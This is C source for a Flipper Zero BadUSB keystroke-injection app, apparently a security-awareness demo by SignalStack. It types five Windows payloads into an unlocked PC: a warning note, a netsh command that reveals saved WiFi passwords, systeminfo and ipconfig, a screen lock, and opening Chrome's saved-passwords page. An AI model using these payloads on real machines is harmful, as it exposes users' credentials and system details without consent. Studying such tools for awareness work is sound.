// BadUSB AutoAttack — USB HID keystroke injection demo
// Company: SignalStack  |  Authorized demonstrations only.
// Demonstrates how quickly a PC can be compromised when left unlocked.
// A $30 USB stick and 3 seconds is all it takes.

#include "badusb_attack.h"
#include <string.h>

// ─────────────────────────────────────────────────────────────────────────────
// HID primitive helpers
// ─────────────────────────────────────────────────────────────────────────────

void ba_press(BaBadUsbApp* app, uint16_t mod, uint16_t key) {
    UNUSED(app);
    furi_hal_hid_kb_press(mod, key);
    furi_delay_ms(25);
    furi_hal_hid_kb_release_all();
    furi_delay_ms(25);
}

// ASCII → (modifier, HID keycode) then press+release
void ba_type_char(BaBadUsbApp* app, char c) {
    uint16_t mod = 0;
    uint16_t key = 0;

    if(c >= 'a' && c <= 'z') {
        key = HID_KEYBOARD_A + (uint16_t)(c - 'a');
    } else if(c >= 'A' && c <= 'Z') {
        mod = BA_MOD_SHIFT;
        key = HID_KEYBOARD_A + (uint16_t)(c - 'A');
    } else if(c >= '1' && c <= '9') {
        key = HID_KEYBOARD_1 + (uint16_t)(c - '1');
    } else if(c == '0') {
        key = HID_KEYBOARD_0;
    } else {
        switch(c) {
        case ' ':  key = HID_KEYBOARD_SPACEBAR; break;
        case '\n': key = HID_KEYBOARD_RETURN;   break;
        case '\t': key = HID_KEYBOARD_TAB;      break;
        case '-':  key = HID_KEYBOARD_MINUS;    break;
        case '_':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_MINUS; break;
        case '=':  key = HID_KEYBOARD_EQUAL_SIGN; break;
        case '+':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_EQUAL_SIGN; break;
        case '[':  key = HID_KEYBOARD_OPEN_BRACKET;  break;
        case ']':  key = HID_KEYBOARD_CLOSE_BRACKET; break;
        case '\\': key = HID_KEYBOARD_BACK_SLASH; break;
        case '|':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_BACK_SLASH; break;
        case ';':  key = HID_KEYBOARD_SEMICOLON; break;
        case ':':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_SEMICOLON; break;
        case '\'': key = HID_KEYBOARD_SINGLE_AND_DOUBLE_QUOTE; break;
        case '"':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_SINGLE_AND_DOUBLE_QUOTE; break;
        case ',':  key = HID_KEYBOARD_COMMA_AND_LESS_THAN_SIGN; break;
        case '<':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_COMMA_AND_LESS_THAN_SIGN; break;
        case '.':  key = HID_KEYBOARD_DOT_GREATER_THAN; break;
        case '>':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_DOT_GREATER_THAN; break;
        case '/':  key = HID_KEYBOARD_SLASH; break;
        case '?':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_SLASH; break;
        case '`':  key = HID_KEYBOARD_GRAVE_ACCENT_AND_TILDE; break;
        case '~':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_GRAVE_ACCENT_AND_TILDE; break;
        case '!':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_1; break;
        case '@':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_2; break;
        case '#':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_3; break;
        case '$':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_4; break;
        case '%':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_5; break;
        case '^':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_6; break;
        case '&':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_7; break;
        case '*':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_8; break;
        case '(':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_9; break;
        case ')':  mod = BA_MOD_SHIFT; key = HID_KEYBOARD_0; break;
        default: return;
        }
    }
    if(key == 0) return;
    ba_press(app, mod, key);
}

void ba_type_string(BaBadUsbApp* app, const char* s) {
    for(; *s; s++) ba_type_char(app, *s);
}

// Push a scrolling status line into the execute view model log
void ba_push_log(BaBadUsbApp* app, const char* line) {
    with_view_model(app->execute_view, ExecuteViewModel* m, {
        if(m->log_count < 4) {
            strncpy(m->log[m->log_count++], line, 31);
        } else {
            memmove(m->log[0], m->log[1], 32);
            memmove(m->log[1], m->log[2], 32);
            memmove(m->log[2], m->log[3], 32);
            strncpy(m->log[3], line, 31);
        }
    }, true);
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload 0 — Warning Note (zero damage, maximum drama)
// Opens Notepad and types a security warning message.
// ─────────────────────────────────────────────────────────────────────────────

static void payload_warning_note(BaBadUsbApp* app) {
    ba_push_log(app, "WIN+R -> notepad");
    ba_press(app, BA_MOD_GUI, BA_KEY('r'));
    furi_delay_ms(700);

    ba_type_string(app, "notepad");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(900);

    ba_push_log(app, "Typing warning...");
    ba_type_string(app, "!! SIGNALSTACK SECURITY DEMO !!\n\n");
    ba_type_string(app, "This notepad was opened by a USB\n");
    ba_type_string(app, "device plugged in 3 seconds ago.\n\n");
    ba_type_string(app, "YOUR PC WAS UNLOCKED.\n");
    ba_type_string(app, "BadUSB = instant access.\n\n");
    ba_type_string(app, "Lock now: WIN + L\n");
    ba_type_string(app, "-- SignalStack.com");

    ba_push_log(app, "Notepad message typed.");
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload 1 — WiFi Password Dump
// Runs: netsh wlan show profile * key=clear | findstr "Key Content"
// Exposes all saved WiFi passwords in a visible PowerShell window.
// ─────────────────────────────────────────────────────────────────────────────

static void payload_wifi_dump(BaBadUsbApp* app) {
    ba_push_log(app, "WIN+R -> powershell");
    ba_press(app, BA_MOD_GUI, BA_KEY('r'));
    furi_delay_ms(700);

    ba_type_string(app, "powershell");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(1200);

    ba_push_log(app, "Dumping WiFi creds...");
    // Short one-liner: shows SSID + plaintext key for every saved profile
    ba_type_string(app, "netsh wlan show profile * key=clear|findstr \"Key Content\"");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(400);

    ba_push_log(app, "Passwords now visible.");
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload 2 — System Info Grab
// Dumps hardware/network/OS info — what an attacker learns in first contact.
// ─────────────────────────────────────────────────────────────────────────────

static void payload_sysinfo(BaBadUsbApp* app) {
    ba_push_log(app, "WIN+R -> cmd");
    ba_press(app, BA_MOD_GUI, BA_KEY('r'));
    furi_delay_ms(700);

    ba_type_string(app, "cmd");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(1000);

    ba_push_log(app, "Running systeminfo...");
    ba_type_string(app, "systeminfo");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(300);

    ba_push_log(app, "ipconfig /all");
    ba_type_string(app, "ipconfig /all");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(300);

    ba_push_log(app, "Sysinfo + net config dumped.");
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload 3 — Instant Screen Lock
// Presses WIN+L — locks the screen instantly.
// Shows: attacker can lock victim out of their own machine in 0.1 seconds.
// ─────────────────────────────────────────────────────────────────────────────

static void payload_lock_screen(BaBadUsbApp* app) {
    ba_push_log(app, "Sending WIN+L...");
    furi_delay_ms(300);
    ba_press(app, BA_MOD_GUI, BA_KEY('l'));
    furi_delay_ms(200);
    ba_push_log(app, "Screen LOCKED.");
    ba_push_log(app, "Victim locked out.");
    ba_push_log(app, "Attacker time: <1 sec");
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload 4 — Saved Browser Credentials
// Opens Chrome to the password manager — shows ALL stored site passwords.
// ─────────────────────────────────────────────────────────────────────────────

static void payload_browser_creds(BaBadUsbApp* app) {
    ba_push_log(app, "WIN+R -> Chrome");
    ba_press(app, BA_MOD_GUI, BA_KEY('r'));
    furi_delay_ms(700);

    // Open Chrome password manager directly
    ba_type_string(app, "chrome chrome://password-manager/passwords");
    ba_press(app, 0, HID_KEYBOARD_RETURN);
    furi_delay_ms(400);

    ba_push_log(app, "Chrome creds page open.");
    ba_push_log(app, "All saved passwords listed.");
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload table
// ─────────────────────────────────────────────────────────────────────────────

const BaPayload BA_PAYLOADS[BA_PAYLOAD_COUNT] = {
    {
        "Warning Note",
        "Windows", "DEMO",
        "Opens Notepad, types security warning",
        payload_warning_note,
    },
    {
        "WiFi Password Dump",
        "Windows", "HIGH",
        "Shows all saved WiFi passwords via netsh",
        payload_wifi_dump,
    },
    {
        "System Info Grab",
        "Windows", "HIGH",
        "Runs systeminfo + ipconfig in CMD",
        payload_sysinfo,
    },
    {
        "Instant Lock",
        "Windows", "DEMO",
        "WIN+L — locks screen in <1 second",
        payload_lock_screen,
    },
    {
        "Browser Credentials",
        "Windows", "CRITICAL",
        "Opens Chrome saved-passwords page",
        payload_browser_creds,
    },
};

// ─────────────────────────────────────────────────────────────────────────────
// App alloc / free / entry
// ─────────────────────────────────────────────────────────────────────────────

static BaBadUsbApp* badusb_attack_alloc(void) {
    BaBadUsbApp* app = malloc(sizeof(BaBadUsbApp));
    memset(app, 0, sizeof(BaBadUsbApp));

    app->gui           = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->scene_manager = scene_manager_alloc(&ba_scene_handlers, app);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher,
                             BaViewSubmenu, submenu_get_view(app->submenu));

    app->execute_view = view_alloc();
    // 256 bytes — enough for ExecuteViewModel (header + 4×32 log lines)
    view_allocate_model(app->execute_view, ViewModelTypeLocking, 256);
    view_dispatcher_add_view(app->view_dispatcher,
                             BaViewExecute, app->execute_view);

    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui,
                                  ViewDispatcherTypeFullscreen);
    return app;
}

static void badusb_attack_free(BaBadUsbApp* app) {
    // Safety: stop HID and restore USB if still active
    furi_hal_hid_kb_release_all();
    if(app->saved_usb_cfg) {
        furi_hal_usb_unlock();
        furi_hal_usb_set(app->saved_usb_cfg);
    }

    view_dispatcher_remove_view(app->view_dispatcher, BaViewSubmenu);
    view_dispatcher_remove_view(app->view_dispatcher, BaViewExecute);
    submenu_free(app->submenu);
    view_free(app->execute_view);
    view_dispatcher_free(app->view_dispatcher);
    scene_manager_free(app->scene_manager);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
}

int32_t badusb_attack_app(void* p) {
    UNUSED(p);
    BaBadUsbApp* app = badusb_attack_alloc();
    scene_manager_next_scene(app->scene_manager, BaSceneMenu);
    view_dispatcher_run(app->view_dispatcher);
    badusb_attack_free(app);
    return 0;
}
